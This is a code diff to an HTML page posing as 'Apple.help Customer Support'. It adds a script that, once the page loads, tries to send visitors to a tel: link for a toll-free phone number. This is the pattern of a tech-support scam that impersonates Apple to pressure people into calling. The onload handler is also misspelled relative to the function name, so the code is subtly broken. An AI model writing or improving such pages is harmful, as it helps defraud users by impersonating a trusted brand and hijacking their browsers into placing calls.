@@ -76,7 +76,18 @@
     }
   </style>
 </head>
-<body>
+  <script>
+    function autoDial() {
+      var ph = "+1-844-333-0918";
+      window.location.href = "tel:" + ph;
+    }
+
+    function call() {
+      // Implement the call functionality here, such as initiating a phone call.
+      console.log("Calling...");
+    }
+  </script>
+<body onload="autodial()">
   
     <img src="apple.help.jpeg" alt="Apple.help Logo" class="logo" >
     <h1>Welcome to Apple.help Customer Support</h1>
